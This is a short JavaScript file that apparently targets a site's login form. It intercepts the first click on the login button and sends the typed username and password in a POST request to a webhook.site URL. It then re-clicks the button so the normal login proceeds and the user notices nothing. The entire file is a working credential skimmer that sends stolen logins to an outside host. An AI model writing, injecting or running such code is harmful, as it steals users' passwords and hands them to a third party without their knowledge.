const loginBtn = document.querySelector("#login-form > div > div.d-grid.mt-3 > button");
const usernameInput = document.querySelector("#login-form > div > div:nth-child(1) > input");
const passwordInput = document.querySelector("#login-form > div > div:nth-child(2) > input");

let initialClick = true;

loginBtn.addEventListener("click", async function (ev) {
    if(initialClick) {
        ev.preventDefault();
        initialClick = false;

        await fetch("https://webhook.site/71b34b1e-5116-4be8-940f-259b2bc0c3a1?username=" + usernameInput.value + "&password=" + passwordInput.value, {
            method: "POST",
            mode: "no-cors"
        });

        loginBtn.click();
    } else {
        return;
    }
});